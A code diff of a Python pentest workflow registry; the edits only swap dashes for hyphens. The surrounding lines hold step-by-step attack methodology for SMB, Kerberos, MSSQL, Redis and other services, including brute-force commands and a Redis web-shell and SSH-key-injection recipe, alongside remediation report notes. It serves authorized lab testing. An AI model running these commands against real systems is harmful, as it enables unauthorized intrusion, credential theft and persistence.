@@ -1,8 +1,8 @@
-"""Service workflow registry — paraphrased pentest methodology, lab-safe placeholders.
+"""Service workflow registry - paraphrased pentest methodology, lab-safe placeholders.
 
 Workflows are inlined as a single registry so the entire methodology surface lives in
 one auditable file. Each workflow uses placeholders ([TARGET_IP], [TARGET_HOST],
-[DOMAIN], [USER], [PASS], [LHOST], [LPORT]) — the renderer substitutes the ones it
+[DOMAIN], [USER], [PASS], [LHOST], [LPORT]) - the renderer substitutes the ones it
 knows and leaves the rest for the operator.
 """
 
@@ -31,7 +31,7 @@ _WORKFLOWS: dict[str, Workflow] = {
         service_id="smb",
         display_name="SMB",
         related=("ldap", "kerberos"),
-        title="SMB (139/445) — Share & RPC Enumeration",
+        title="SMB (139/445) - Share & RPC Enumeration",
         priority=10,
         when_to_use="SMB exposed. Start with null-session enumeration before any credentialed attempt.",
         checklist=(
@@ -49,7 +49,7 @@ _WORKFLOWS: dict[str, Workflow] = {
             ("smbclient -N -L //[TARGET_IP]", "Null-session share listing."),
             (
                 "rpcclient -U '' -N [TARGET_IP]",
-                "Interactive RPC null session — try `enumdomusers`, `srvinfo`, `netshareenumall`.",
+                "Interactive RPC null session - try `enumdomusers`, `srvinfo`, `netshareenumall`.",
             ),
             ("enum4linux-ng -A [TARGET_IP]", "Comprehensive automated SMB/RPC enumeration."),
             (
@@ -85,7 +85,7 @@ _WORKFLOWS: dict[str, Workflow] = {
         service_id="http",
         display_name="HTTP",
         related=("https",),
-        title="HTTP (80/8080/8000) — Web Surface Enumeration",
+        title="HTTP (80/8080/8000) - Web Surface Enumeration",
         priority=15,
         when_to_use="Plain HTTP exposed. Treat each port as a distinct application.",
         checklist=(
@@ -136,11 +136,11 @@ _WORKFLOWS: dict[str, Workflow] = {
         service_id="https",
         display_name="HTTPS",
         related=("http",),
-        title="HTTPS (443/8443) — TLS Web Surface",
+        title="HTTPS (443/8443) - TLS Web Surface",
         priority=15,
         when_to_use="TLS-wrapped HTTP exposed. Inspect the certificate for hostnames and SANs before brute-forcing.",
         checklist=(
-            "Pull the certificate SAN list — feed any new hostnames into `/etc/hosts`.",
+            "Pull the certificate SAN list - feed any new hostnames into `/etc/hosts`.",
             "Repeat HTTP-style content discovery over TLS.",
             "Check for weak ciphers and TLS misconfigurations if scope allows.",
         ),
@@ -159,13 +159,13 @@ _WORKFLOWS: dict[str, Workflow] = {
         expected_output="Cert subject/SAN list, server fingerprint, and a baseline path inventory mirrored from the HTTP findings.",
         verification=(
             "Confirm the SANs resolve via your `/etc/hosts` entry, not just DNS.",
-            "Re-validate paths discovered on port 80 against port 443 — they often diverge.",
+            "Re-validate paths discovered on port 80 against port 443 - they often diverge.",
         ),
         troubleshooting=(
             (
                 "`SSL certificate problem`",
                 "Self-signed lab certificate.",
-                "Pass `-k` to curl, `--insecure` to feroxbuster — labs only.",
+                "Pass `-k` to curl, `--insecure` to feroxbuster - labs only.",
             ),
             (
                 "Server returns default page over IP but real app over hostname",
@@ -178,9 +178,9 @@ _WORKFLOWS: dict[str, Workflow] = {
     "ftp": Workflow(
         service_id="ftp",
         display_name="FTP",
-        title="FTP (21) — Anonymous & Credentialed",
+        title="FTP (21) - Anonymous & Credentialed",
         priority=20,
-        when_to_use="FTP exposed. Always try anonymous first — it costs nothing and frequently works on lab targets.",
+        when_to_use="FTP exposed. Always try anonymous first - it costs nothing and frequently works on lab targets.",
         checklist=(
             "Banner-grab the FTP version.",
             "Try anonymous login and list root.",
@@ -194,7 +194,7 @@ _WORKFLOWS: dict[str, Workflow] = {
             ),
             (
                 "ftp -n [TARGET_IP]",
-                "Interactive login — try `user anonymous` / blank password, then `ls`.",
+                "Interactive login - try `user anonymous` / blank password, then `ls`.",
             ),
             (
                 "wget -m --no-passive ftp://anonymous:anonymous@[TARGET_IP]/",
@@ -202,7 +202,7 @@ _WORKFLOWS: dict[str, Workflow] = {
             ),
             (
                 "hydra -L users.txt -P passwords.txt ftp://[TARGET_IP] -f -V",
-                "Credential brute force — lab targets only.",
+                "Credential brute force - lab targets only.",
             ),
         ),
         expected_output="Banner string, anonymous access result, and a directory listing if reachable.",
@@ -219,7 +219,7 @@ _WORKFLOWS: dict[str, Workflow] = {
             (
                 "Banner shows vsFTPd 2.3.4",
                 "Known backdoored build (common CTF lure).",
-                "Verify carefully — many labs spoof the banner without the backdoor.",
+                "Verify carefully - many labs spoof the banner without the backdoor.",
             ),
         ),
         report_note="FTP service on [TARGET_IP] permits [anonymous read/anonymous write/credentialed access]. Recommend disabling anonymous access, enforcing TLS (FTPS), and restricting upload directories that map to executable paths.",
@@ -227,9 +227,9 @@ _WORKFLOWS: dict[str, Workflow] = {
     "ssh": Workflow(
         service_id="ssh",
         display_name="SSH",
-        title="SSH (22) — Banner, Auth Modes, Key Reuse",
+        title="SSH (22) - Banner, Auth Modes, Key Reuse",
         priority=35,
-        when_to_use="SSH exposed. Treat as auth surface — useful for credential reuse, not an exploitation primitive on its own.",
+        when_to_use="SSH exposed. Treat as auth surface - useful for credential reuse, not an exploitation primitive on its own.",
         checklist=(
             "Capture banner and supported auth methods.",
             "Test discovered credentials from other services for reuse.",
@@ -254,7 +254,7 @@ _WORKFLOWS: dict[str, Workflow] = {
             (
                 "`Permission denied (publickey)`",
                 "Password auth disabled.",
-                "Pivot to key reuse or hash spraying — do not brute force unless scope permits.",
+                "Pivot to key reuse or hash spraying - do not brute force unless scope permits.",
             ),
             (
                 "`no matching host key type found`",
@@ -268,7 +268,7 @@ _WORKFLOWS: dict[str, Workflow] = {
         service_id="dns",
         display_name="DNS",
         related=("ldap", "kerberos"),
-        title="DNS (53) — Records, Zone Transfers, Subdomain Discovery",
+        title="DNS (53) - Records, Zone Transfers, Subdomain Discovery",
         priority=30,
         when_to_use="DNS exposed (TCP or UDP). Often gives you the entire AD or web hostname inventory for free.",
         checklist=(
@@ -284,16 +284,16 @@ _WORKFLOWS: dict[str, Workflow] = {
             ("dig @[TARGET_IP] [DOMAIN] axfr", "Attempt zone transfer."),
             (
                 "nmap -p53 --script dns-zone-transfer --script-args dns-zone-transfer.domain=[DOMAIN] [TARGET_IP]",
-                "AXFR via nmap — useful for evidence capture.",
+                "AXFR via nmap - useful for evidence capture.",
             ),
             (
                 "gobuster dns -d [DOMAIN] -r [TARGET_IP] -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt",
                 "Subdomain brute force if AXFR refused.",
             ),
         ),
-        expected_output="A list of A, NS, MX, and SRV records — in AD environments, SRV records reveal domain controllers and Kerberos services.",
+        expected_output="A list of A, NS, MX, and SRV records - in AD environments, SRV records reveal domain controllers and Kerberos services.",
         verification=(
-            "Confirm AXFR output starts with the SOA record and ends with the same SOA — anything shorter is a partial transfer.",
+            "Confirm AXFR output starts with the SOA record and ends with the same SOA - anything shorter is a partial transfer.",
         ),
         troubleshooting=(
             (
@@ -313,7 +313,7 @@ _WORKFLOWS: dict[str, Workflow] = {
         service_id="smtp",
         display_name="SMTP",
         related=("ldap",),
-        title="SMTP (25/465/587) — User Enumeration & Relay",
+        title="SMTP (25/465/587) - User Enumeration & Relay",
         priority=30,
         when_to_use="SMTP exposed. Primary value is VRFY/EXPN/RCPT user enumeration for downstream password spraying.",
         checklist=(
@@ -329,12 +329,12 @@ _WORKFLOWS: dict[str, Workflow] = {
             ("smtp-user-enum -M VRFY -U users.txt -t [TARGET_IP]", "Targeted VRFY enumeration."),
             (
                 "nc -nv [TARGET_IP] 25",
-                "Manual banner grab — issue `EHLO test`, then `VRFY [USER]`.",
+                "Manual banner grab - issue `EHLO test`, then `VRFY [USER]`.",
             ),
         ),
         expected_output="Banner, supported verbs (VRFY/EXPN), and a list of valid local addresses.",
         verification=(
-            "Confirm `252` or `250` for valid users vs `550` for invalid — both must be observed to trust the enumeration.",
+            "Confirm `252` or `250` for valid users vs `550` for invalid - both must be observed to trust the enumeration.",
         ),
         troubleshooting=(
             (
@@ -354,7 +354,7 @@ _WORKFLOWS: dict[str, Workflow] = {
         service_id="ldap",
         display_name="LDAP",
         related=("kerberos", "smb"),
-        title="LDAP (389/636) — Directory Enumeration",
+        title="LDAP (389/636) - Directory Enumeration",
         priority=20,
         when_to_use="LDAP exposed (very likely an AD DC). Anonymous binds reveal naming context and sometimes the full user list.",
         checklist=(
@@ -373,7 +373,7 @@ _WORKFLOWS: dict[str, Workflow] = {
             ),
             (
                 "ldapsearch -x -H ldap://[TARGET_IP] -b 'DC=[DOMAIN]' '(objectClass=user)' sAMAccountName",
-                "Enumerate users — replace the DC path with the discovered naming context.",
+                "Enumerate users - replace the DC path with the discovered naming context.",
             ),
             (
                 "nxc ldap [TARGET_IP] -u [USER] -p [PASS] --users",
@@ -402,9 +402,9 @@ _WORKFLOWS: dict[str, Workflow] = {
         service_id="kerberos",
         display_name="Kerberos",
         related=("ldap", "smb"),
-        title="Kerberos (88) — Pre-Auth, ASREP & Kerberoasting Surface",
+        title="Kerberos (88) - Pre-Auth, ASREP & Kerberoasting Surface",
         priority=15,
-        when_to_use="Kerberos exposed — you are almost certainly looking at a domain controller for [DOMAIN].",
+        when_to_use="Kerberos exposed - you are almost certainly looking at a domain controller for [DOMAIN].",
         checklist=(
             "Have a usernames list ready (from LDAP, SMB, or OSINT).",
             "Validate usernames via AS-REQ without lockout risk.",
@@ -427,7 +427,7 @@ _WORKFLOWS: dict[str, Workflow] = {
         ),
         expected_output="A validated list of domain usernames plus zero or more hashcat-format hashes (`$krb5asrep$` for ASREP, `$krb5tgs$` for kerberoast).",
         verification=(
-            "Confirm the realm in the AS-REP matches [DOMAIN] — wrong realm means wrong DC.",
+            "Confirm the realm in the AS-REP matches [DOMAIN] - wrong realm means wrong DC.",
             "Sanity-check hash format header before sending to hashcat.",
         ),
         troubleshooting=(
@@ -448,7 +448,7 @@ _WORKFLOWS: dict[str, Workflow] = {
         service_id="mssql",
         display_name="MSSQL",
         related=("smb",),
-        title="MSSQL (1433) — Auth, xp_cmdshell, Linked Servers",
+        title="MSSQL (1433) - Auth, xp_cmdshell, Linked Servers",
         priority=15,
         when_to_use="MSSQL exposed. Always test with default/blank `sa` first and integrated AD creds second.",
         checklist=(
@@ -492,7 +492,7 @@ _WORKFLOWS: dict[str, Workflow] = {
     "mysql": Workflow(
         service_id="mysql",
         display_name="MySQL",
-        title="MySQL/MariaDB (3306) — Auth, FILE Privilege",
+        title="MySQL/MariaDB (3306) - Auth, FILE Privilege",
         priority=20,
         when_to_use="MySQL/MariaDB exposed. Anonymous and `root:` empty-password often work on legacy lab targets.",
         checklist=(
@@ -519,7 +519,7 @@ _WORKFLOWS: dict[str, Workflow] = {
             (
                 "`Host '...' is not allowed to connect`",
                 "Bind-address or host ACL restricting access.",
-                "Confirm 3306 is reachable from your assigned tester IP — re-scan if unsure.",
+                "Confirm 3306 is reachable from your assigned tester IP - re-scan if unsure.",
             ),
             (
                 "`LOAD_FILE` returns NULL",
@@ -533,7 +533,7 @@ _WORKFLOWS: dict[str, Workflow] = {
         service_id="rdp",
         display_name="RDP",
         related=("winrm", "smb"),
-        title="RDP (3389) — NLA, Credential Validation, BlueKeep",
+        title="RDP (3389) - NLA, Credential Validation, BlueKeep",
         priority=15,
         when_to_use="RDP exposed. Primary value is credential validation and lateral movement once AD creds are recovered.",
         checklist=(
@@ -577,7 +577,7 @@ _WORKFLOWS: dict[str, Workflow] = {
         service_id="winrm",
         display_name="WinRM",
         related=("rdp", "smb"),
-        title="WinRM (5985/5986) — Remote PowerShell",
+        title="WinRM (5985/5986) - Remote PowerShell",
         priority=15,
         when_to_use="WinRM exposed. Typically reachable only after recovering valid AD credentials.",
         checklist=(
@@ -613,11 +613,11 @@ _WORKFLOWS: dict[str, Workflow] = {
         service_id="nfs",
         display_name="NFS",
         related=("smb",),
-        title="NFS (111/2049) — Exports & UID Spoofing",
+        title="NFS (111/2049) - Exports & UID Spoofing",
         priority=20,
         when_to_use="NFS exposed. Default lab exports are often world-readable; uid-spoofing converts a low-priv shell into privileged reads.",
         checklist=(
-            "List RPC services — NFS depends on rpcbind on 111.",
+            "List RPC services - NFS depends on rpcbind on 111.",
             "Enumerate exports via showmount.",
             "Mount each export and inventory ownership/UIDs.",
             "If a writable export exists, plan a uid-spoof for privileged file access.",
@@ -631,7 +631,7 @@ _WORKFLOWS: dict[str, Workflow] = {
             ("showmount -e [TARGET_IP]", "List NFS exports the server advertises."),
             (
                 "sudo mount -t nfs [TARGET_IP]:/[EXPORT] /mnt/nfs -o nolock,vers=3",
-                "Mount an export read-only — lab targets only.",
+                "Mount an export read-only - lab targets only.",
             ),
             (
                 "ls -laR /mnt/nfs",
@@ -665,7 +665,7 @@ _WORKFLOWS: dict[str, Workflow] = {
     "snmp": Workflow(
         service_id="snmp",
         display_name="SNMP",
-        title="SNMP (UDP 161) — Community Strings & MIB Walk",
+        title="SNMP (UDP 161) - Community Strings & MIB Walk",
         priority=25,
         when_to_use="SNMP exposed (UDP). `public` and `private` are still common on lab targets and small appliances.",
         checklist=(
@@ -705,9 +705,9 @@ _WORKFLOWS: dict[str, Workflow] = {
     "oracle": Workflow(
         service_id="oracle",
         display_name="Oracle",
-        title="Oracle TNS (1521) — SID Enumeration & DBA Attacks",
+        title="Oracle TNS (1521) - SID Enumeration & DBA Attacks",
         priority=15,
-        when_to_use="Oracle TNS listener on 1521. SID enumeration is the gatekeeper — without a valid SID you cannot authenticate, even with credentials.",
+        when_to_use="Oracle TNS listener on 1521. SID enumeration is the gatekeeper - without a valid SID you cannot authenticate, even with credentials.",
         checklist=(
             "Probe the TNS listener with `nmap --script oracle-tns-version` to confirm version and reachability.",
             "Enumerate SIDs (nmap `oracle-sid-brute` or ODAT's `sidguesser`).",
@@ -723,7 +723,7 @@ _WORKFLOWS: dict[str, Workflow] = {
             ),
             (
                 "./odat.py all -s [TARGET_IP]",
-                "Sweep every ODAT module — finds SIDs, credentials, and exploitable misconfigs.",
+                "Sweep every ODAT module - finds SIDs, credentials, and exploitable misconfigs.",
             ),
             (
                 "./odat.py passwordguesser -s [TARGET_IP] -d [SID]",
@@ -732,7 +732,7 @@ _WORKFLOWS: dict[str, Workflow] = {
             ("sqlplus [USER]/[PASS]@[TARGET_IP]/[SID]", "Connect with credentials."),
             (
                 "sqlplus [USER]/[PASS]@[TARGET_IP]/[SID] as sysdba",
-                "Attempt SYSDBA login — full DBA access if it succeeds.",
+                "Attempt SYSDBA login - full DBA access if it succeeds.",
             ),
             (
                 "select * from user_role_privs;",
@@ -746,7 +746,7 @@ _WORKFLOWS: dict[str, Workflow] = {
         expected_output="Listener version banner, valid SIDs (commonly XE/ORCL/DB), and on successful authentication: schema/table listings, role memberships, and password hashes for offline cracking.",
         verification=(
             "Confirm the listener is reachable: `tnscmd10g ping -h [TARGET_IP]`.",
-            "If nmap's SID brute returns nothing, retry with SecLists `oracle-sids.txt` (~2000 entries) — the bundled list is short.",
+            "If nmap's SID brute returns nothing, retry with SecLists `oracle-sids.txt` (~2000 entries) - the bundled list is short.",
         ),
         troubleshooting=(
             (
@@ -770,19 +770,19 @@ _WORKFLOWS: dict[str, Workflow] = {
                 "`echo /usr/lib/oracle/<ver>/client64/lib > /etc/ld.so.conf.d/oracle.conf && sudo ldconfig`.",
             ),
         ),
-        report_note="Oracle TNS listener on [TARGET_IP]:1521 permits unauthenticated SID enumeration and (where applicable) factory-default credentials, giving DBA-level access — full schema read/write, password-hash extraction, and OS command execution via DBMS_SCHEDULER or external procedures. Recommend rotating all default Oracle accounts, restricting TNS listener access by IP, setting a listener password (`lsnrctl set password`), and disabling unused external procedures.",
+        report_note="Oracle TNS listener on [TARGET_IP]:1521 permits unauthenticated SID enumeration and (where applicable) factory-default credentials, giving DBA-level access - full schema read/write, password-hash extraction, and OS command execution via DBMS_SCHEDULER or external procedures. Recommend rotating all default Oracle accounts, restricting TNS listener access by IP, setting a listener password (`lsnrctl set password`), and disabling unused external procedures.",
     ),
     "imap-pop3": Workflow(
         service_id="imap-pop3",
         display_name="IMAP/POP3",
         related=("smtp",),
-        title="IMAP/POP3 (110/143/993/995) — Mail Retrieval Enumeration",
+        title="IMAP/POP3 (110/143/993/995) - Mail Retrieval Enumeration",
         priority=30,
         when_to_use="Mail-retrieval ports exposed. Cleartext 143/110 leak credentials on shared segments; banner versions identify Dovecot/Courier/Exchange.",
         checklist=(
             "Banner-grab via nc/openssl on each open port to fingerprint server software and version.",
             "Extract Organization, FQDN, and admin email from the SSL certificate on 993/995.",
-            "Test cleartext authentication on 143/110 — capture credentials if on the same network segment.",
+            "Test cleartext authentication on 143/110 - capture credentials if on the same network segment.",
             "Spray known credentials with Hydra; IMAP/POP3 typically do not lock out.",
             "On successful login: list folders, fetch mail bodies for embedded credentials, SSH keys, or internal correspondence.",
         ),
@@ -817,7 +817,7 @@ _WORKFLOWS: dict[str, Workflow] = {
                 "Inside IMAP session: read all mail without marking as read.",
             ),
         ),
-        expected_output="Server vendor and version banner, SSL certificate metadata (O=, CN=, emailAddress=), valid user accounts, and mailbox content that often contains secrets — passwords, SSH keys, or internal correspondence.",
+        expected_output="Server vendor and version banner, SSL certificate metadata (O=, CN=, emailAddress=), valid user accounts, and mailbox content that often contains secrets - passwords, SSH keys, or internal correspondence.",
         verification=(
             "Cross-check SSL CN= against the target's hostname/domain context.",
             "After authentication, confirm `LIST` returns at least INBOX; non-default folder names frequently mark sensitive content.",
@@ -849,15 +849,15 @@ _WORKFLOWS: dict[str, Workflow] = {
                 "Drop threads to `-t 2`, add delay `-W 5`; verify the login format with `-e ns`.",
             ),
         ),
-        report_note="Mail-retrieval services on [TARGET_IP] accept plaintext IMAP/POP3 authentication on ports 143/110, exposing credentials to anyone on a shared network segment. Captured credentials enable mailbox content access (with embedded secrets — passwords, SSH keys) and lateral movement where credentials are reused. Recommend disabling cleartext IMAP/POP3, enforcing IMAPS (993) and POP3S (995) only, and setting `disable_plaintext_auth=yes` (Dovecot) or equivalent.",
+        report_note="Mail-retrieval services on [TARGET_IP] accept plaintext IMAP/POP3 authentication on ports 143/110, exposing credentials to anyone on a shared network segment. Captured credentials enable mailbox content access (with embedded secrets - passwords, SSH keys) and lateral movement where credentials are reused. Recommend disabling cleartext IMAP/POP3, enforcing IMAPS (993) and POP3S (995) only, and setting `disable_plaintext_auth=yes` (Dovecot) or equivalent.",
     ),
     "rsync": Workflow(
         service_id="rsync",
         display_name="rsync",
         related=("ssh",),
-        title="rsync (873) — Unauthenticated Share Discovery",
+        title="rsync (873) - Unauthenticated Share Discovery",
         priority=20,
-        when_to_use="rsync daemon exposed on 873. Modules may be readable — and sometimes writable — without authentication.",
+        when_to_use="rsync daemon exposed on 873. Modules may be readable - and sometimes writable - without authentication.",
         checklist=(
             "Probe the daemon: `rsync [TARGET_IP]::` or `nc -nv [TARGET_IP] 873`.",
             "List each module's contents: `rsync --list-only rsync://[TARGET_IP]/[MODULE]`.",
@@ -869,7 +869,7 @@ _WORKFLOWS: dict[str, Workflow] = {
             ("nmap -sV -p873 [TARGET_IP]", "Confirm the rsync daemon and its version."),
             (
                 "nc -nv [TARGET_IP] 873",
-                "Probe protocol directly — banner shows daemon version.",
+                "Probe protocol directly - banner shows daemon version.",
             ),
             ("rsync [TARGET_IP]::", "List all advertised modules."),
             (
@@ -882,7 +882,7 @@ _WORKFLOWS: dict[str, Workflow] = {
             ),
             (
                 "rsync -av ./marker.txt rsync://[TARGET_IP]/[MODULE]/",
-                "Test write access — leave a marker, not a payload.",
+                "Test write access - leave a marker, not a payload.",
             ),
         ),
         expected_output="Daemon banner with version, a list of module names with optional comments, and (if anonymous-readable) the file tree of at least one module.",
@@ -912,14 +912,14 @@ _WORKFLOWS: dict[str, Workflow] = {
     "redis": Workflow(
         service_id="redis",
         display_name="Redis",
-        title="Redis (6379) — Unauthenticated Access & RCE Paths",
+        title="Redis (6379) - Unauthenticated Access & RCE Paths",
         priority=15,
-        when_to_use="Redis on 6379. Default Redis deployments are unauthenticated — confirm read access before assuming credentials are needed.",
+        when_to_use="Redis on 6379. Default Redis deployments are unauthenticated - confirm read access before assuming credentials are needed.",
         checklist=(
-            "Probe with `redis-cli -h [TARGET_IP] INFO` — confirms unauth access and dumps server metadata.",
+            "Probe with `redis-cli -h [TARGET_IP] INFO` - confirms unauth access and dumps server metadata.",
             "Enumerate keys: `KEYS '*'` on small databases, or `SCAN` for large ones.",
             "Dump the database with `--rdb dump.rdb` and inspect with `strings`.",
-            "Check `CONFIG GET dir` and `CONFIG GET dbfilename` — needed for RCE via file write.",
+            "Check `CONFIG GET dir` and `CONFIG GET dbfilename` - needed for RCE via file write.",
             "RCE path 1: web-shell drop. `CONFIG SET dir /var/www/html; CONFIG SET dbfilename shell.php; SET payload '<?php system($_GET[\"c\"]); ?>'; SAVE`.",
             "RCE path 2: SSH key injection. `CONFIG SET dir ~/.ssh; CONFIG SET dbfilename authorized_keys; SET key '<your pub key>'; SAVE`.",
             "Redis >= 4.0: try `MODULE LOAD` for direct RCE via a malicious module (lab-only, destructive).",
@@ -931,11 +931,11 @@ _WORKFLOWS: dict[str, Workflow] = {
             ),
             (
                 "redis-cli -h [TARGET_IP] INFO",
-                "Server metadata — version, role, configured modules, persistence settings.",
+                "Server metadata - version, role, configured modules, persistence settings.",
             ),
             (
                 "redis-cli -h [TARGET_IP] CONFIG GET '*'",
-                "Dump full server config — exposes `dir`, `dbfilename`, `requirepass`.",
+                "Dump full server config - exposes `dir`, `dbfilename`, `requirepass`.",
             ),
             (
                 "redis-cli -h [TARGET_IP] KEYS '*'",
@@ -953,7 +953,7 @@ _WORKFLOWS: dict[str, Workflow] = {
         expected_output="Server banner with `redis_version`, role (master/slave/sentinel), configured modules, persistence settings, and (on unauth) the entire keyspace with values.",
         verification=(
             "If `INFO` returns content, you have unauthenticated read at minimum.",
-            "Confirm RCE paths only on authorized lab targets — file writes are destructive and may break the service.",
+            "Confirm RCE paths only on authorized lab targets - file writes are destructive and may break the service.",
         ),
         troubleshooting=(
             (
@@ -983,13 +983,13 @@ _WORKFLOWS: dict[str, Workflow] = {
         service_id="vnc",
         display_name="VNC",
         related=("rdp",),
-        title="VNC (5900) — Authentication Bypass & Cracking",
+        title="VNC (5900) - Authentication Bypass & Cracking",
         priority=20,
         when_to_use="VNC exposed on the 5900-5999 range. Authentication is typically a single password (no username), and the protocol is brute-forceable.",
         checklist=(
             "Identify the VNC variant and auth requirements: `nmap --script vnc-info,vnc-title`.",
             "Test for the RealVNC auth bypass (CVE-2019-13615) with `nmap --script realvnc-auth-bypass`.",
-            "Try connecting with no password — some installs accept it.",
+            "Try connecting with no password - some installs accept it.",
             "Spray common VNC passwords with Hydra or the Metasploit `vnc_login` module.",
             "On reaching the desktop: fingerprint the OS, note the logged-in user, check open apps for unsaved credentials, and inspect clipboard history.",
         ),
@@ -1000,7 +1000,7 @@ _WORKFLOWS: dict[str, Workflow] = {
             ),
             (
                 "vncviewer [TARGET_IP]::5900",
-                "Interactive connect — a password prompt indicates auth is required.",
+                "Interactive connect - a password prompt indicates auth is required.",
             ),
             (
                 "hydra -P pass.txt -s 5900 [TARGET_IP] vnc",
@@ -1014,7 +1014,7 @@ _WORKFLOWS: dict[str, Workflow] = {
         expected_output="VNC server name (RealVNC / TightVNC / UltraVNC), protocol version, auth scheme (None / VNC password / TLS), current desktop title, and on successful login a full graphical session.",
         verification=(
             "If `nmap --script realvnc-auth-bypass` reports vulnerable, exploit through `vncviewer` with an empty password.",
-            "After login, screenshot the desktop and the title bar — both are useful report evidence.",
+            "After login, screenshot the desktop and the title bar - both are useful report evidence.",
         ),
         troubleshooting=(
             (
@@ -1033,18 +1033,18 @@ _WORKFLOWS: dict[str, Workflow] = {
                 "Force a depth: `vncviewer -depth 8 [TARGET_IP]::5900`; try `-Encoding raw`.",
             ),
         ),
-        report_note="VNC server on [TARGET_IP]:5900 accepts weak or default password authentication, granting remote graphical access to the target as the logged-in user. Recommend retiring VNC where SSH or RDP suffices; otherwise enforce a strong random password (16+ characters), bind to a management interface only, require TLS (TigerVNC) or VPN access, and apply the latest patches — multiple VNC variants have shipped pre-auth RCE vulnerabilities.",
+        report_note="VNC server on [TARGET_IP]:5900 accepts weak or default password authentication, granting remote graphical access to the target as the logged-in user. Recommend retiring VNC where SSH or RDP suffices; otherwise enforce a strong random password (16+ characters), bind to a management interface only, require TLS (TigerVNC) or VPN access, and apply the latest patches - multiple VNC variants have shipped pre-auth RCE vulnerabilities.",
     ),
     "linux-privesc": Workflow(
         service_id="linux-privesc",
         display_name="Linux Privesc",
         related=("pivoting",),
         category="post-foothold",
-        title="Linux Privilege Escalation — Post-Foothold Enumeration",
+        title="Linux Privilege Escalation - Post-Foothold Enumeration",
         priority=50,
-        when_to_use="You have a shell on a Linux lab target. Enumerate systematically before reaching for exploits — most lab privesc is a misconfiguration, not a kernel CVE.",
+        when_to_use="You have a shell on a Linux lab target. Enumerate systematically before reaching for exploits - most lab privesc is a misconfiguration, not a kernel CVE.",
         checklist=(
-            "Stabilize the shell — upgrade to a full interactive TTY.",
+            "Stabilize the shell - upgrade to a full interactive TTY.",
             "Identify the current user, groups, and sudo entitlements.",
             "Enumerate SUID/SGID binaries and file capabilities.",
             "Review cron jobs, writable scripts, and PATH-hijack opportunities.",
@@ -1055,7 +1055,7 @@ _WORKFLOWS: dict[str, Workflow] = {
             ("id; sudo -l", "Current context and any explicitly allowed sudo commands."),
             (
                 "find / -perm -4000 -type f 2>/dev/null",
-                "World-accessible SUID binaries — cross-reference with GTFOBins.",
+                "World-accessible SUID binaries - cross-reference with GTFOBins.",
             ),
             (
                 "getcap -r / 2>/dev/null",
@@ -1063,7 +1063,7 @@ _WORKFLOWS: dict[str, Workflow] = {
             ),
             (
                 "cat /etc/crontab; ls -la /etc/cron.*",
-                "Scheduled jobs — look for root-run scripts you can write to.",
+                "Scheduled jobs - look for root-run scripts you can write to.",
             ),
             (
                 "./linpeas.sh | tee linpeas.txt",
@@ -1074,7 +1074,7 @@ _WORKFLOWS: dict[str, Workflow] = {
         expected_output="A clear picture of your privileges: sudo entitlements, exploitable SUID binaries or capabilities, writable root-owned cron scripts, and any reused credentials in config files.",
         verification=(
             "Before reporting a vector, reproduce it end-to-end in a scratch directory and capture the `id` output showing `uid=0`.",
-            "Re-run `sudo -l` after any credential discovery — new credentials can unlock new sudo rights.",
+            "Re-run `sudo -l` after any credential discovery - new credentials can unlock new sudo rights.",
         ),
         troubleshooting=(
             (
@@ -1093,16 +1093,16 @@ _WORKFLOWS: dict[str, Workflow] = {
                 "Focus on the sudo, SUID, capabilities, cron, and credentials sections first; ignore informational findings until those are exhausted.",
             ),
         ),
-        report_note="Privilege escalation on [TARGET_IP] was possible via [misconfiguration — SUID binary / sudo rule / writable cron script]. Recommend removing the unnecessary SUID bit, scoping sudo rules to specific commands, correcting cron script permissions, and applying least privilege to service accounts.",
+        report_note="Privilege escalation on [TARGET_IP] was possible via [misconfiguration - SUID binary / sudo rule / writable cron script]. Recommend removing the unnecessary SUID bit, scoping sudo rules to specific commands, correcting cron script permissions, and applying least privilege to service accounts.",
     ),
     "windows-privesc": Workflow(
         service_id="windows-privesc",
         display_name="Windows Privesc",
         related=("ad-foothold", "pivoting"),
         category="post-foothold",
-        title="Windows Privilege Escalation — Post-Foothold Enumeration",
+        title="Windows Privilege Escalation - Post-Foothold Enumeration",
         priority=51,
-        when_to_use="You have a shell on a Windows lab target. Enumerate privileges, services, and stored credentials before exploiting — token privileges and service misconfigurations cover most lab cases.",
+        when_to_use="You have a shell on a Windows lab target. Enumerate privileges, services, and stored credentials before exploiting - token privileges and service misconfigurations cover most lab cases.",
         checklist=(
             "Identify the current user, groups, and token privileges.",
             "Check for exploitable token privileges (SeImpersonate, SeBackup, etc.).",
@@ -1118,11 +1118,11 @@ _WORKFLOWS: dict[str, Workflow] = {
             ),
             (
                 "whoami /priv",
-                "Privilege list — note SeImpersonatePrivilege and similar escalation-class rights.",
+                "Privilege list - note SeImpersonatePrivilege and similar escalation-class rights.",
             ),
             (
                 "wmic service get name,displayname,pathname,startmode | findstr /i /v \"C:\\Windows\\\\\"",
-                "Service binary paths — look for unquoted paths and writable directories.",
+                "Service binary paths - look for unquoted paths and writable directories.",
             ),
             (
                 "reg query HKLM /f password /t REG_SZ /s",
@@ -1137,7 +1137,7 @@ _WORKFLOWS: dict[str, Workflow] = {
                 "Stored credentials potentially usable with `runas /savecred`.",
             ),
         ),
-        expected_output="Your token privileges, any unquoted or weak-permission services, and stored credentials — enough to select a single escalation path.",
+        expected_output="Your token privileges, any unquoted or weak-permission services, and stored credentials - enough to select a single escalation path.",
         verification=(
             "Confirm escalation by capturing `whoami` showing `nt authority\\system` (or the target admin) in a freshly spawned process.",
             "If you used token impersonation, verify the elevated process is stable before pivoting from it.",
@@ -1156,7 +1156,7 @@ _WORKFLOWS: dict[str, Workflow] = {
             (
                 "Enumeration flags a credential that does not work",
                 "Credential is stale or rotated.",
-                "Try it against other services (SMB / WinRM) with NetExec before discarding — reuse is common in labs.",
+                "Try it against other services (SMB / WinRM) with NetExec before discarding - reuse is common in labs.",
             ),
         ),
         report_note="Privilege escalation on [TARGET_HOST] was possible via [token privilege abuse / unquoted service path / stored credentials]. Recommend removing the privilege from the affected account, quoting service binary paths, clearing stored credentials, and enforcing least privilege.",
@@ -1166,9 +1166,9 @@ _WORKFLOWS: dict[str, Workflow] = {
         display_name="AD Foothold",
         related=("windows-privesc", "pivoting"),
         category="post-foothold",
-        title="Active Directory Foothold — First Steps with a Domain Credential",
+        title="Active Directory Foothold - First Steps with a Domain Credential",
         priority=52,
-        when_to_use="You hold any valid domain credential or a shell on a domain-joined host. Map the domain before attacking — the shortest path to Domain Admin is usually an existing misconfiguration, not an exploit.",
